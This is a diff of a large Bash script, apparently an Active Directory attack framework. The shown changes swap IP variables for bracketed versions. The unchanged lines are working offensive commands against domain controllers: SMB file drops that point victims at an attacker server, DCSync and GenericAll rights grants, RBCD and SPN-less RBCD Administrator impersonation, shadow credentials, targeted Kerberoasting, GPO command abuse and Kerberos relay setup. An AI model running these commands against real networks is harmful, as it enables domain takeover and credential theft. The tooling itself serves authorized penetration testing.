-    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M drop-sc -o server=${attacker_IP} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
-    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M drop-library-ms -o server=${attacker_IP} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
-    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M slinky -o server=${attacker_IP} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M drop-sc -o server=${attacker_IP_bracket} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M drop-library-ms -o server=${attacker_IP_bracket} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M slinky -o server=${attacker_IP_bracket} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -3760,7 +3799,7 @@ mssqlpwner_console() {
                 read -rp ">> " mssqlpwner_target </dev/tty
             done
             echo -e "${BLUE}[*] Opening mssqlpwner console${NC}"
-            run_command "${mssqlpwner} ${argument_mssqlpwner}@${mssqlpwner_target} -dc-ip ${dc_ip} -windows-auth interactive" | tee -a "${MSSQL_dir}/mssqlpwner_output_${user_var}.txt" 2>&1
+            run_command "${mssqlpwner} ${argument_mssqlpwner}@${mssqlpwner_target} -dc-ip ${dc_ip_bracket} -windows-auth interactive" | tee -a "${MSSQL_dir}/mssqlpwner_output_${user_var}.txt" 2>&1
             cd "${current_dir}" || exit
         fi
     fi
@@ -3814,7 +3853,7 @@ change_pass() {
             read -rp ">> " pass_passchange </dev/tty
             if [[ ${pass_passchange} == "" ]]; then pass_passchange="Summer3000_"; fi
             echo -e "${CYAN}[*] Changing password of ${target_passchange} to ${pass_passchange}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set password '${target_passchange}' '${pass_passchange}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_passchange_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} set password '${target_passchange}' '${pass_passchange}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_passchange_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3842,7 +3881,7 @@ add_group_member() {
             read -rp ">> " user_groupmem </dev/tty
             if [ "${user_groupmem}" == "" ]; then user_groupmem="${user}"; fi
             echo -e "${CYAN}[*] Adding ${user_groupmem} to group ${target_groupmem}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add groupMember '${target_groupmem}' '${user_groupmem}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_groupmem_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add groupMember '${target_groupmem}' '${user_groupmem}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_groupmem_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3870,7 +3909,7 @@ remove_group_member() {
             read -rp ">> " user_groupmem </dev/tty
             if [ "${user_groupmem}" == "" ]; then user_groupmem="${user}"; fi
             echo -e "${CYAN}[*] Removing ${user_groupmem} from group ${target_groupmem}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove groupMember '${target_groupmem}' '${user_groupmem}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_groupmem_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} remove groupMember '${target_groupmem}' '${user_groupmem}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_groupmem_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3892,7 +3931,7 @@ add_computer() {
             read -rp ">> " pass_addcomp </dev/tty
             if [[ ${pass_addcomp} == "" ]]; then pass_addcomp="Summer3000_"; fi
             echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_addcomp_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add computer '${host_addcomp}' '${pass_addcomp}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_addcomp_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3921,7 +3960,7 @@ add_computer_ou() {
                 read -rp ">> " ou_addcomp </dev/tty
             done
             echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp} to OU ${ou_addcomp}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}' --ou '${ou_addcomp}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_addcomp_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add computer '${host_addcomp}' '${pass_addcomp}' --ou '${ou_addcomp}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_addcomp_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3943,7 +3982,8 @@ dnsentry_add() {
             echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"
             set_attackerIP
             echo -e "${BLUE}[*] Adding new DNS entry ${hostname_dnstool} with IP ${attacker_IP} for Active Directory integrated DNS${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord '${hostname_dnstool}' '${attacker_IP}'" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_add_${dc_domain}.txt"
+            # bloodyAD add dnsRecord creates an A (IPv4) record; IPv6/AAAA is not supported upstream
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} --dns ${dns_ip} add dnsRecord '${hostname_dnstool}' '${attacker_IP}'" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_add_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3970,7 +4010,7 @@ dnsentry_remove() {
                 read -rp ">> " dns_remove_IP </dev/tty
             done
             echo -e "${BLUE}[*] Removing DNS entry ${hostname_dnstool} with IP ${dns_remove_IP} for Active Directory integrated DNS${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} remove dnsRecord '${hostname_dnstool}' '${dns_remove_IP}'" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_dns_remove_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} --dns ${dns_ip} remove dnsRecord '${hostname_dnstool}' '${dns_remove_IP}'" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_dns_remove_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3994,7 +4034,7 @@ enable_account() {
                 read -rp ">> " account_enable </dev/tty
             done
             echo -e "${BLUE}[*] Enabling account ${account_enable}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -f rc4 remove uac '${account_enable}' -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_enable_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} -f rc4 remove uac '${account_enable}' -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_enable_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4018,7 +4058,7 @@ disable_account() {
                 read -rp ">> " account_disable </dev/tty
             done
             echo -e "${BLUE}[*] Disabling account ${account_disable}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -f rc4 add uac '${account_disable}' -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_disable_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} -f rc4 add uac '${account_disable}' -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_disable_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4042,7 +4082,7 @@ restore_account() {
                 read -rp ">> " account_restore </dev/tty
             done
             echo -e "${BLUE}[*] Restoring account ${account_restore}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set restore '${account_restore}'" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_restore_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} set restore '${account_restore}'" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_restore_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4067,7 +4107,7 @@ change_owner() {
                 read -rp ">> " target_ownerchange </dev/tty
             done
             echo -e "${CYAN}[*] Changing Owner of ${target_ownerchange} to ${user}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set owner '${target_ownerchange}' '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_ownerchange_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} set owner '${target_ownerchange}' '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_ownerchange_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4091,7 +4131,7 @@ add_genericall() {
                 read -rp ">> " target_genericall </dev/tty
             done
             echo -e "${CYAN}[*] Adding GenericAll rights on ${target_genericall} to ${user}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add genericAll '${target_genericall}' '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_genericall_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add genericAll '${target_genericall}' '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_genericall_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4115,7 +4155,7 @@ delete_object() {
                 read -rp ">> " obj_delete </dev/tty
             done
             echo -e "${CYAN}[*] Deleting object ${obj_delete}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove object '${obj_delete}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_delobj_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} remove object '${obj_delete}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_delobj_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4130,7 +4170,7 @@ targetedkerberoast_attack() {
         else
             echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-            run_command "${python3} ${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${Kerberos_dir}/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee "${Modification_dir}/targetedkerberoast_output_${user_var}.txt"
+            run_command "${python3} ${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip_bracket} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${Kerberos_dir}/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee "${Modification_dir}/targetedkerberoast_output_${user_var}.txt"
             if [ -s "${Kerberos_dir}/targetedkerberoast_hashes_${dc_domain}.txt" ]; then
                 hash_count=$(wc -l < "${Kerberos_dir}/targetedkerberoast_hashes_${dc_domain}.txt")
                 if [[ ! "${hash_count}" == 0 ]]; then
@@ -4172,12 +4212,12 @@ rbcd_attack() {
                 read -rp ">> " service_rbcd </dev/tty
             done
             echo -e "${CYAN}[*] Performing RBCD attack against ${target_rbcd} using account ${service_rbcd}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${service_rbcd}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcd_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add rbcd '${target_rbcd}$' '${service_rbcd}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcd_${dc_domain}.txt"
             if grep -q "can now impersonate users" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcd_${dc_domain}.txt"; then
                 echo -e "${GREEN}[+] RBCD Attack successful! Run option Kerberos/18 or the command below to generate ticket${NC}"
-                echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}:<PASSWORD>'"
+                echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip_bracket} '${domain}/${service_rbcd}:<PASSWORD>'"
                 echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
-                echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}'"
+                echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} remove rbcd '${target_rbcd}$' '${service_rbcd}'"
             fi
         fi
     fi
@@ -4229,25 +4269,25 @@ rbcd_spnless_attack() {
                 current_dir=$(pwd)
                 cd "${Modification_dir}/" || exit
                 echo -e "${CYAN}[*] Requesting TGT for user ${user_spnless}${NC}"
-                run_command "${impacket_getTGT} ${domain}/${user_spnless} -hashes :${spnless_hash} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee -a "${Modification_dir}/impacket_spnless_changepasswd_${user_var}.txt"
+                run_command "${impacket_getTGT} ${domain}/${user_spnless} -hashes :${spnless_hash} -dc-ip ${dc_ip_bracket}" | grep -v "Impacket" | sed '/^$/d' | tee -a "${Modification_dir}/impacket_spnless_changepasswd_${user_var}.txt"
                 if stat "${Modification_dir}/${user_spnless}.ccache" >/dev/null 2>&1; then
                     krb_ticket="${Modification_dir}/${user_spnless}.ccache"
                     echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb_ticket"
-                    run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${user_spnless}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcdspnless_${dc_domain}.txt"
+                    run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add rbcd '${target_rbcd}$' '${user_spnless}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcdspnless_${dc_domain}.txt"
                     ticketsesskey=$(${impacket_describeticket} "${Modification_dir}/${user_spnless}.ccache" | grep 'Ticket Session Key' | cut -d " " -f 17)
-                    run_command "${impacket_changepasswd} ${domain}/${user_spnless}\\@${dc_ip} -hashes :${spnless_hash} -newhashes :${ticketsesskey}" | tee -a "${Modification_dir}/impacket_spnless_changepasswd_${user_var}.txt"
+                    run_command "${impacket_changepasswd} ${domain}/${user_spnless}\\@${dc_ip_bracket} -hashes :${spnless_hash} -newhashes :${ticketsesskey}" | tee -a "${Modification_dir}/impacket_spnless_changepasswd_${user_var}.txt"
                     if grep -q "can now impersonate users" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcdspnless_${dc_domain}.txt"; then
                         echo -e "${GREEN}[+] SPN-less RBCD Attack successful! Attempting to generate ticket to impersonate Administrator${NC}"
-                        run_command "KRB5CCNAME=${Modification_dir}/${user_spnless}.ccache ${impacket_getST} -u2u -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${user_spnless}' -k -no-pass"
+                        run_command "KRB5CCNAME=${Modification_dir}/${user_spnless}.ccache ${impacket_getST} -u2u -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip_bracket} '${domain}/${user_spnless}' -k -no-pass"
                         if stat "${Modification_dir}/Administrator@cifs_${target_rbcd}.${domain}@${domain}.ccache" >/dev/null 2>&1; then
                             echo -e "${GREEN}[+] Ticket impersonating Administrator generated successfully!${NC}"
                         else
                             echo -e "${RED}[-] Generation of ticket impersonating Administrator failed!${NC}"
                         fi
                         echo -e "${CYAN}[!] Run command below to reset password of ${user_spnless}:${NC}"
-                        echo -e "${impacket_changepasswd} ${domain}/${user_spnless}@${dc_ip} -hashes :${ticketsesskey} -newpass <NEW PASSWORD>"
+                        echo -e "${impacket_changepasswd} ${domain}/${user_spnless}@${dc_ip_bracket} -hashes :${ticketsesskey} -newpass <NEW PASSWORD>"
                         echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
-                        echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${user_spnless}'"
+                        echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} remove rbcd '${target_rbcd}$' '${user_spnless}'"
                     fi
                 elif [ "${noexec_bool}" == "false" ]; then
                     echo -e "${RED}[-] Failed to generate TGT${NC}"
@@ -4278,7 +4318,7 @@ shadowcreds_attack() {
                 read -rp ">> " target_shadowcreds </dev/tty
             done
             echo -e "${CYAN}[*] Performing ShadowCredentials attack against ${target_shadowcreds}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_shadowcreds}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_shadowcreds}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add shadowCredentials '${target_shadowcreds}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_shadowcreds}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4310,7 +4350,7 @@ shadowcreds_delete() {
                 key_param_shadowcreds=""
             fi
             echo -e "${CYAN}[*] Removing Key Credentials from ${target_shadowcreds}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove shadowCredentials ${key_param_shadowcreds} '${target_shadowcreds}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} remove shadowCredentials ${key_param_shadowcreds} '${target_shadowcreds}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4349,7 +4389,7 @@ pygpo_abuse() {
         read -rp ">> " command_input_gpoabuse </dev/tty
         if [ ! "${command_input_gpoabuse}" == "" ]; then command_gpoabuse="-command ${command_input_gpoabuse}"; fi
         if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
-        run_command "${python3} ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id '${target_gpoabuse}' ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a "${Modification_dir}/pygpoabuse_output_${user_var}.txt"
+        run_command "${python3} ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip_bracket} -gpo-id '${target_gpoabuse}' ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a "${Modification_dir}/pygpoabuse_output_${user_var}.txt"
     fi
     echo -e ""
 }
@@ -4368,7 +4408,7 @@ add_dcsync() {
             read -rp ">> " target_dcsync </dev/tty
             if [ "${target_dcsync}" == "" ]; then target_dcsync="${user}"; fi
             echo -e "${CYAN}[*] Adding DCSync rights to ${target_dcsync}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add dcsync '${target_dcsync}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_dcsync_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add dcsync '${target_dcsync}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_dcsync_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4392,7 +4432,7 @@ add_unconstrained() {
                 read -rp ">> " target_unconsdeleg </dev/tty
             done
             echo -e "${CYAN}[*] Adding Unconstrained Delegation rights to ${target_unconsdeleg}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_unconsdeleg}$' -f TRUSTED_FOR_DELEGATION" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_unconsdeleg_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add uac '${target_unconsdeleg}$' -f TRUSTED_FOR_DELEGATION" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_unconsdeleg_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4416,11 +4456,11 @@ add_spn() {
                 read -rp ">> " target_spn </dev/tty
             done
             echo -e "${CYAN}[*] Adding CIFS and HTTP SPNs to ${target_spn}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' ServicePrincipalName -v 'HOST/${target_spn}' -v 'HOST/${target_spn}.${domain}' -v 'RestrictedKrbHost/${target_spn}' -v 'RestrictedKrbHost/${target_spn}.${domain}' -v 'CIFS/${target_spn}.${domain}' -v 'HTTP/${target_spn}.${domain}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_${dc_domain}.txt"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' msDS-AdditionalDnsHostName -v '${target_spn}.${domain}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} set object '${target_spn}$' ServicePrincipalName -v 'HOST/${target_spn}' -v 'HOST/${target_spn}.${domain}' -v 'RestrictedKrbHost/${target_spn}' -v 'RestrictedKrbHost/${target_spn}.${domain}' -v 'CIFS/${target_spn}.${domain}' -v 'HTTP/${target_spn}.${domain}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} set object '${target_spn}$' msDS-AdditionalDnsHostName -v '${target_spn}.${domain}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_${dc_domain}.txt"
             if grep -q -a "has been updated" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_${dc_domain}.txt"; then
                 echo -e "${GREEN}[+] Adding CIFS and HTTP SPNs successful! Run command below to perform Kerberos relay attack${NC}"
-                echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${target_spn}.${domain} --dc-ip $dc_ip"
+                echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip_bracket} -l ${target_spn}.${domain} --dc-ip ${dc_ip_bracket}"
                 echo -e "${python3} krbrelayx-master/krbrelayx.py -hashes :< NTLM hash of computer account >"
             fi
         fi
@@ -4454,7 +4494,7 @@ add_upn() {
                 read -rp ">> " value_upn </dev/tty
             done
             echo -e "${CYAN}[*] Adding UPN ${value_upn} to ${target_upn}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_upn}' userPrincipalName -v '${value_upn}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_upn_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} set object '${target_upn}' userPrincipalName -v '${value_upn}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_upn_${dc_domain}.txt"
             if grep -q -a "has been updated" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_upn_${dc_domain}.txt"; then
                 echo -e "${GREEN}[+] Adding UPN successful!${NC}"
                 echo -e "${BLUE}[*] Please specify NTLM hash of ${target_upn}. Press ENTER to retrieve target's NT hash using Shadow Credentials:${NC}"
@@ -4462,7 +4502,7 @@ add_upn() {
                 read -rp ">> " target_upn_hash </dev/tty
                 if [ -z "$target_upn_hash" ]; then
                     if [ "${ldaps_bool}" == true ]; then ldaps_param_ba="-s"; else ldaps_param_ba=""; fi
-                    run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param_ba} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_upn}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_upn}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
+                    run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param_ba} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add shadowCredentials '${target_upn}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_upn}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
                     target_upn_hash=$(grep ${target_upn} "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt" -A 2| grep '^NT:' | tail -n 1 | cut -d ' ' -f 2 | tr -d ' \r\n')
                 fi
                 if [ -z "$target_upn_hash" ] || ! ([[ (${#target_upn_hash} -eq 65 && "${target_upn_hash:32:1}" == ":") || (${#target_upn_hash} -eq 33 && "${target_upn_hash:0:1}" == ":") || (${#target_upn_hash} -eq 32) ]]); then
@@ -4471,11 +4511,11 @@ add_upn() {
                     echo -e "${BLUE}[*] Generating Kerberos ticket of impersonated user:${NC}"
                     current_dir=$(pwd)
                     cd "${Credentials_dir}" || exit
-                    run_command "${impacket_getTGT} -principal NT_ENTERPRISE ${domain}/${value_upn} -hashes :${target_upn_hash} -dc-ip ${dc_ip}"
+                    run_command "${impacket_getTGT} -principal NT_ENTERPRISE ${domain}/${value_upn} -hashes :${target_upn_hash} -dc-ip ${dc_ip_bracket}"
                     cd "${current_dir}" || exit
                     if stat "${Credentials_dir}/${value_upn//\$/}.ccache" >/dev/null 2>&1; then
